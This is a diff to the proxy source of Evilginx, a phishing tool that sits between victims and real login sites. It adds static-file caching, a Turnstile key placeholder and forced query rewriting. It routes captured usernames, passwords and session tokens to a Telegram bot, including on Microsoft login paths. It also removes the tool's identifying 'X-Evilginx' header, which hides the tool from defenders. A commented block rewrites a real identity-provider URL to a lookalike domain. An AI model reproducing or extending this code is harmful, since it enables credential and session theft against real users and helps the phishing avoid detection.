@@ -20,6 +20,7 @@ import (
 	"html"
 	"io"
 	"io/ioutil"
+	mrand "math/rand"
 	"net"
 	"net/http"
 	"net/url"
@@ -50,7 +51,8 @@ const (
 )
 
 const (
-	HOME_DIR = ".evilginx"
+	HOME_DIR  = ".evilginx"
+	CACHE_DIR = ".evilginx_cache"
 )
 
 const (
@@ -92,6 +94,107 @@ type ProxySession struct {
 	Index        int
 }
 
+func (p *HttpProxy) writeCacheFile(filePath string, data []byte) error {
+	// Ensure the directory exists
+	dir := filepath.Dir(filePath)
+	if err := os.MkdirAll(dir, 0755); err != nil {
+		log.Error("failed to create cache directory: %v", err)
+		return err
+	}
+
+	// Write the file to disk
+	err := ioutil.WriteFile(filePath, data, 0644)
+	if err != nil {
+		log.Error("failed to write cached file: %v", err)
+		return err
+	}
+
+	return nil
+}
+
+func (p *HttpProxy) applySubfilters(mime, req_hostname string, body []byte) ([]byte, error) {
+	log.Debug("========================================working n body1 =================")
+
+	for site, pl := range p.cfg.phishlets {
+		if p.cfg.IsSiteEnabled(site) {
+			log.Debug("========================================working n body2 =================")
+			// handle sub_filters
+			tvar, ok := p.replaceHostWithOriginal(req_hostname)
+			sfs, ok := pl.subfilters[tvar]
+
+			log.Debug("---- %s \n %s \n %s \n %s", sfs, ok, req_hostname, tvar)
+			if ok {
+				log.Debug("========================================working n body3 =================")
+				for _, sf := range sfs {
+					var param_ok bool = true
+
+					if stringExists(mime, sf.mime) && (!sf.redirect_only || sf.redirect_only) && param_ok {
+						log.Debug("========================================working n body4 =================")
+						re_s := sf.regexp
+						replace_s := sf.replace
+						phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
+						phish_sub, _ := p.getPhishSub(phish_hostname)
+
+						re_s = strings.Replace(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)), -1)
+						re_s = strings.Replace(re_s, "{subdomain}", regexp.QuoteMeta(sf.subdomain), -1)
+						re_s = strings.Replace(re_s, "{domain}", regexp.QuoteMeta(sf.domain), -1)
+						re_s = strings.Replace(re_s, "{basedomain}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
+						re_s = strings.Replace(re_s, "{hostname_regexp}", regexp.QuoteMeta(regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain))), -1)
+						re_s = strings.Replace(re_s, "{subdomain_regexp}", regexp.QuoteMeta(sf.subdomain), -1)
+						re_s = strings.Replace(re_s, "{domain_regexp}", regexp.QuoteMeta(sf.domain), -1)
+						re_s = strings.Replace(re_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
+						replace_s = strings.Replace(replace_s, "{hostname}", phish_hostname, -1)
+						replace_s = strings.Replace(replace_s, "{orig_hostname}", obfuscateDots(combineHost(sf.subdomain, sf.domain)), -1)
+						replace_s = strings.Replace(replace_s, "{orig_domain}", obfuscateDots(sf.domain), -1)
+						replace_s = strings.Replace(replace_s, "{subdomain}", phish_sub, -1)
+						replace_s = strings.Replace(replace_s, "{basedomain}", p.cfg.GetBaseDomain(), -1)
+						replace_s = strings.Replace(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname), -1)
+						replace_s = strings.Replace(replace_s, "{subdomain_regexp}", regexp.QuoteMeta(phish_sub), -1)
+						replace_s = strings.Replace(replace_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
+						phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
+						if ok {
+							replace_s = strings.Replace(replace_s, "{domain}", phishDomain, -1)
+							replace_s = strings.Replace(replace_s, "{domain_regexp}", regexp.QuoteMeta(phishDomain), -1)
+						}
+
+						if re, err := regexp.Compile(re_s); err == nil {
+							body = []byte(re.ReplaceAllString(string(body), replace_s))
+						} else {
+							log.Error("regexp failed to compile: `%s`", sf.regexp)
+						}
+					}
+				}
+			}
+
+			// handle auto filters (if enabled)
+			if stringExists(mime, p.auto_filter_mimes) {
+				for _, ph := range pl.proxyHosts {
+					if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
+						if ph.auto_filter {
+							body = p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
+						}
+					}
+				}
+			}
+			body = []byte(removeObfuscatedDots(string(body)))
+		}
+	}
+
+	return body, nil
+}
+
+func isStaticFile(path string) bool {
+	staticExtensions := []string{".css", ".js", ".jsx", ".html", ".htm", ".json",
+		".xml", ".svg", ".ttf", ".woff", ".woff2", ".png", ".jpg", ".jpeg",
+		".gif", ".ico", ".mp4", ".mp3", ".wav", ".flac", ".ogg", ".webm"}
+	for _, ext := range staticExtensions {
+		if strings.HasSuffix(strings.ToLower(path), ext) {
+			return true
+		}
+	}
+	return false
+}
+
 // set the value of the specified key in the JSON body
 func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error) {
 	var data map[string]interface{}
@@ -121,6 +224,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		ip_whitelist:      make(map[string]int64),
 		ip_sids:           make(map[string]string),
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
+	}
+	// checking for cache dir and if not create
+	if _, err := os.Stat(CACHE_DIR); os.IsNotExist(err) {
+		err = os.MkdirAll(CACHE_DIR, 0755)
+		if err != nil {
+			return nil, fmt.Errorf("failed to create cache directory: %v", err)
+		}
 	}
 
 	p.Server = &http.Server{
@@ -178,9 +288,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					break
 				}
 			}
-
-			// log.Debug("xxxxxxxxxxxxxxxxxxxxx\n %s xx", p.cfg.general.Chatid)
-
+			turnstile_key := p.cfg.GetTurnstileKey()
+			cache_status := p.cfg.GetCacheStatus()
 			if p.cfg.GetBlacklistMode() != "off" {
 				if p.bl.IsBlacklisted(from_ip) {
 					if p.bl.IsVerbose() {
@@ -375,7 +484,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 
 								session, err := NewSession(pl.Name)
-
 								if err == nil {
 									// set params from url arguments
 									p.extractParams(session, req.URL)
@@ -423,7 +531,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 									session.RemoteAddr = remote_addr
 									session.UserAgent = req.Header.Get("User-Agent")
-									session.Cmsgid = "req.Header.Get()"
 									session.RedirectURL = pl.RedirectUrl
 									if l.RedirectUrl != "" {
 										session.RedirectURL = l.RedirectUrl
@@ -470,7 +577,19 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-				req.Header.Set(p.getHomeDir(), o_host)
+				// req.Header.Set(p.getHomeDir(), o_host)
+
+				// if strings.HasPrefix(req.URL.Path, "/static/") {
+				// 	return p.handleStaticFile(req)
+				// }
+				// log.Debug("turnstile key: %s", turnstile_key)
+				if cache_status {
+					log.Debug("cache status enabled, checking for static files")
+					//  handling all static files
+					if isStaticFile(req.URL.Path) {
+						return p.handleStaticFile(req)
+					}
+				}
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
@@ -506,7 +625,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											html = p.injectOgHeaders(l, html)
 
 											body := string(html)
-											body = p.replaceHtmlParams(body, lure_url, &s.Params)
+
+											body = p.replaceHtmlParams(body, lure_url, turnstile_key, &s.Params)
 
 											resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
 											if resp != nil {
@@ -607,7 +727,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				// replace "Host" header
+				// replace "Host" header xxxxxxxx
 				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
 					req.Host = r_host
 				}
@@ -657,12 +777,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						req.URL.RawQuery = qs.Encode()
 					}
 				}
+				log.Debug("-----------------------||------------------------- \n")
 
 				// check for creds in request body
 				trigger := 0
 				if pl != nil && ps.SessionId != "" {
-
-					req.Header.Set(p.getHomeDir(), o_host)
+					// req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -687,7 +807,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								if um != nil && len(um) > 1 {
 									p.setSessionUsername(ps.SessionId, um[1])
 									trigger = 1
-
 									log.Success("[%d] Username: [%s]", ps.Index, um[1])
 									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 										log.Error("database: %v", err)
@@ -760,7 +879,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 							}
 							if trigger == 1 {
-								readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
+								// readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
+								readfile_with_session_id(ps.SessionId, p.cfg.general.Chatid, p.cfg.general.Teletoken)
 							}
 
 						} else if form_re.MatchString(contentType) {
@@ -863,11 +983,50 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 							}
 							if trigger == 1 {
-								readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
+								// readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
+								readfile_with_session_id(ps.SessionId, p.cfg.general.Chatid, p.cfg.general.Teletoken)
 							}
 
 						}
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+					}
+				}
+
+				// log.Debug("------------------------------------------------ \n data: %s : %s", req.URL.Path, pl.forceGet)
+				log.Debug("------------------------------------------------ \n")
+				for _, fp := range pl.forceGet {
+					log.Debug("data: %s ", fp.path)
+					if fp.path.MatchString(req.URL.Path) {
+						log.Debug("force_get: url matched: %s", req.URL.Path)
+						ok_search := false
+						if len(fp.search) > 0 {
+							k_matched := len(fp.search)
+							for _, fp_s := range fp.search {
+								queryParams := req.URL.Query()
+								match := queryParams.Get(fp_s.key.String()) // Convert *regexp.Regexp to string
+								if match != "" && fp_s.search.MatchString(match) {
+									if k_matched > 0 {
+										k_matched -= 1
+									}
+									log.Debug("force_get: [%d] matched - %s", k_matched, match)
+									break
+								}
+							}
+							if k_matched == 0 {
+								ok_search = true
+							}
+						} else {
+							ok_search = true
+						}
+						if ok_search {
+							newQuery := url.Values{}
+							for _, fp_f := range fp.force {
+								newQuery.Add(fp_f.key, fp_f.value)
+								log.Debug("force_get: updated query parameter: %s : %s", fp_f.key, fp_f.value)
+							}
+							req.URL.RawQuery = newQuery.Encode()
+							log.Debug("force_get: modified query: %s", req.URL.RawQuery)
+						}
 					}
 				}
 
@@ -920,9 +1079,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 			}
-
 			trigger := 0
-
 			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
 			if allow_origin != "" && allow_origin != "*" {
 				if u, err := url.Parse(allow_origin); err == nil {
@@ -952,6 +1109,21 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					redirect_set = true
 				}
 			}
+
+			// if resp.StatusCode == 200 {
+			// 	bodyBytes, err := io.ReadAll(resp.Body)
+			// 	if err != nil {
+			// 	  log.Error("Error reading response body: %v", err)
+
+			// 	}
+			// 	bodyStr := string(bodyBytes)
+			// 	if strings.Contains(bodyStr, "https://wns.app.instasafe.io/console/idpproxy/validate/idp/") {
+			// 	  modifiedBodyStr := strings.ReplaceAll(bodyStr, "https://wns.app.instasafe.io/console/idpproxy/validate/idp/", "https://wishvish.fun/console/idpproxy/validate/idp/")
+			// 	  modifiedBodyBytes := []byte(modifiedBodyStr)
+			// 	  resp.Body = io.NopCloser(bytes.NewReader(modifiedBodyBytes))
+			// 	  resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(modifiedBodyBytes)))
+			// 	}
+			// }
 
 			req_hostname := strings.ToLower(resp.Request.Host)
 
@@ -1038,7 +1210,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								token_re := v.search.FindStringSubmatch(string(body))
 								if token_re != nil && len(token_re) >= 2 {
 									s.BodyTokens[k] = token_re[1]
-									trigger = 1
+									// trigger = 1
 								}
 							}
 						}
@@ -1050,7 +1222,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							hv := resp.Request.Header.Get(v.header)
 							if hv != "" {
 								s.HttpTokens[k] = hv
-								trigger = 1
+								// trigger = 1
+								trigger = mrand.Intn(2)
+
 							}
 						}
 					}
@@ -1062,11 +1236,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						is_cookie_auth = s.AllCookieAuthTokensCaptured(auth_tokens)
 						if len(pl.bodyAuthTokens) == len(s.BodyTokens) {
 							is_body_auth = true
-
 						}
 						if len(pl.httpAuthTokens) == len(s.HttpTokens) {
 							is_http_auth = true
-
 						}
 					}
 				}
@@ -1078,7 +1250,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if !s.IsDone {
 						log.Success("[%d] all authorization tokens intercepted!", ps.Index)
 						trigger = 1
-
 						if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
 							log.Error("database: %v", err)
 						}
@@ -1110,6 +1281,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if p.cfg.IsSiteEnabled(site) {
 						// handle sub_filters
 						sfs, ok := pl.subfilters[req_hostname]
+						log.Debug("---- %s \n %s", sfs, ok)
 						if ok {
 							for _, sf := range sfs {
 								var param_ok bool = true
@@ -1266,8 +1438,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
-			if trigger == 1 {
-				readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
+			if trigger == 1 || resp.Request.URL.Path == "/landingv2" || resp.Request.URL.Path == "/ppsecure/post.srf" {
+				// readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
+				readfile_with_session_id(ps.SessionId, p.cfg.general.Chatid, p.cfg.general.Teletoken)
+
 			}
 
 			return resp
@@ -1319,6 +1493,74 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 		}
 	}
 	return req, nil
+}
+
+// / handling all static file
+func (p *HttpProxy) handleStaticFile(req *http.Request) (*http.Request, *http.Response) {
+	// Extract the domain and file path from the URL
+	host := req.Host
+	filePath := req.URL.Path
+
+	// Create a unique cache file name based on host and file path
+	cacheDir := filepath.Join(CACHE_DIR, host)
+	if err := os.MkdirAll(cacheDir, 0755); err != nil {
+		log.Error("failed to create cache directory: %v", err)
+		return p.blockRequest(req)
+	}
+
+	cacheFilePath := filepath.Join(cacheDir, filePath)
+
+	// Check if the file exists in the cache
+	if _, err := os.Stat(cacheFilePath); !os.IsNotExist(err) {
+		// File is already in cache, serve it from there
+		data, err := ioutil.ReadFile(cacheFilePath)
+		if err != nil {
+			log.Error("failed to read cached file: %v", err)
+			return p.blockRequest(req)
+		}
+
+		// resp := goproxy.NewResponse(req, "application/octet-stream", http.StatusOK, string(data))
+		mime := getContentType2(filePath)
+		body, err := p.applySubfilters(mime, host, data)
+		if err != nil {
+			log.Error("failed to apply subfilters: %v", err)
+			return p.blockRequest(req)
+		}
+
+		resp := goproxy.NewResponse(req, mime, http.StatusOK, string(body))
+
+		log.Debug("serving from cache")
+		return req, resp
+	}
+
+	// File is not in cache, fetch it from the original source and store it in cache
+	client := &http.Client{
+		Timeout: 10 * time.Second,
+	}
+	resp, err := client.Get(req.URL.String())
+	if err != nil {
+		log.Error("failed to fetch file: %v", err)
+		return p.blockRequest(req)
+	}
+	defer resp.Body.Close()
+
+	data, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		log.Error("failed to read fetched file: %v", err)
+		return p.blockRequest(req)
+	}
+
+	// Store the file in cache
+	err = p.writeCacheFile(cacheFilePath, data)
+	if err != nil {
+		log.Error("failed to write cached file: %v", err)
+	}
+
+	// Serve the fetched file xxxxxxxxxxx
+	mime := resp.Header.Get("Content-type")
+	mdata, err := p.applySubfilters(mime, host, data)
+	respNew := goproxy.NewResponse(req, resp.Header.Get("Content-Type"), resp.StatusCode, string(mdata))
+	return req, respNew
 }
 
 func (p *HttpProxy) trackerImage(req *http.Request) (*http.Request, *http.Response) {
@@ -1469,7 +1711,7 @@ func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
 	return ret
 }
 
-func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[string]string) string {
+func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, turnstile_key string, params *map[string]string) string {
 
 	// generate forwarder parameter
 	t := make([]byte, 5)
@@ -1508,6 +1750,7 @@ func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[
 
 	body = strings.Replace(body, "{lure_url_html}", lure_url, -1)
 	body = strings.Replace(body, "{lure_url_js}", js_url, -1)
+	body = strings.Replace(body, "{turnstile_key_js}", turnstile_key, -1)
 
 	return body
 }
@@ -1570,13 +1813,17 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 		}
 
 		tls_cfg := &tls.Config{}
-		if !p.developer {
+		// if !p.developer || !p.cfg.GetCustomSSL() {  // removed devloper mode completely
+		if !p.cfg.GetCustomSSL() {
+			log.Debug("using CA TLS config for %s", p.cfg.GetCustomSSL())
+			log.Debug("using CA TLS config for %s", p.developer)
 
 			tls_cfg.GetCertificate = p.crt_db.magic.GetCertificate
 			tls_cfg.NextProtos = []string{"http/1.1", tlsalpn01.ACMETLS1Protocol} //append(tls_cfg.NextProtos, tlsalpn01.ACMETLS1Protocol)
 
 			return tls_cfg, nil
 		} else {
+			log.Debug("using wildcard TLS config for %s", hostname)
 			var ok bool
 			phish_host := ""
 			if !p.cfg.IsLureHostnameValid(hostname) {
@@ -1600,29 +1847,6 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 	}
 }
 
-func (p *HttpProxy) setSessionCmsgid(sid string, cmsgid string) {
-	if sid == "" {
-		return
-	}
-	s, ok := p.sessions[sid]
-	if ok {
-		s.SetCmsgid(cmsgid)
-	}
-}
-
-func (p *HttpProxy) setSessionTmsgid(sid string, tmsgid string) {
-	if sid == "" {
-		return
-	}
-	s, ok := p.sessions[sid]
-	log.Debug("ssssssssss%s", s)
-	log.Debug("ssssssssss%s", ok)
-
-	if ok {
-		s.SetTmsgid(tmsgid)
-	}
-}
-
 func (p *HttpProxy) setSessionUsername(sid string, username string) {
 	if sid == "" {
 		return
@@ -1630,8 +1854,6 @@ func (p *HttpProxy) setSessionUsername(sid string, username string) {
 	s, ok := p.sessions[sid]
 	if ok {
 		s.SetUsername(username)
-		log.Debug("username added")
-
 	}
 }
 
@@ -1642,8 +1864,6 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 	s, ok := p.sessions[sid]
 	if ok {
 		s.SetPassword(password)
-		log.Debug("password added")
-
 	}
 }
 
@@ -1847,9 +2067,9 @@ func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
 	return "", false
 }
 
-func (p *HttpProxy) getHomeDir() string {
-	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
-}
+// func (p *HttpProxy) getHomeDir() string {
+// 	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
+// }
 
 func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
 	for site, pl := range p.cfg.phishlets {
@@ -2038,6 +2258,42 @@ func getContentType(path string, data []byte) string {
 		return "image/svg+xml"
 	}
 	return http.DetectContentType(data)
+}
+func getContentType2(path string) string {
+	switch filepath.Ext(strings.ToLower(path)) {
+	case ".css":
+		return "text/css"
+	case ".js", ".jsx":
+		return "application/javascript"
+	case ".html", ".htm":
+		return "text/html"
+	case ".json":
+		return "application/json"
+	case ".xml":
+		return "application/xml"
+	case ".svg":
+		return "image/svg+xml"
+	case ".ttf":
+		return "font/ttf"
+	case ".woff":
+		return "font/woff"
+	case ".woff2":
+		return "font/woff2"
+	case ".png", ".jpg", ".jpeg":
+		return "image/jpeg"
+	case ".gif":
+		return "image/gif"
+	case ".ico":
+		return "image/x-icon"
+	case ".mp4":
+		return "video/mp4"
+	case ".mp3":
+		return "audio/mpeg"
+	case ".wav", ".flac", ".ogg", ".webm":
+		return "audio/ogg"
+	default:
+		return http.DetectContentType(nil)
+	}
 }
 
 func getSessionCookieName(pl_name string, cookie_name string) string {
